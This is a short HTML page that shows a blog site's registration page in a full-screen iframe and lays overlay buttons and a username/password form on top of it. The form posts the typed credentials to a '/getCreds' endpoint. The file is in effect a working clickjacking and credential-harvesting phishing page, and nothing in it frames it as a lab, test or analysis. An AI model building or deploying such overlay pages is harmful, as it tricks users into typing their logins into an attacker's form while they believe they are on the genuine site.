<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script src="script.js" type="text/javascript"></script>
    <link rel="stylesheet" href="style.css">
    <title>Fullscreen Iframe</title>
</head>
<body>
    <iframe id="myIframe" src="http://www.myblogapp.com/register"  allowfullscreen></iframe>
    <div class="overlay">
        <a href='/'><button id='home'></button> </a>
        <a href='/login'><button id='login'></button> </a>
    </div>
    <form action='/getCreds' class="overlay" method="POST">
      <input type="text" id="username-overlay" name='username'>
      <input type="password" id="password-overlay" name='passwd'>
      <button id="submit-overlay"></button>
    </form>
</body>
</html>
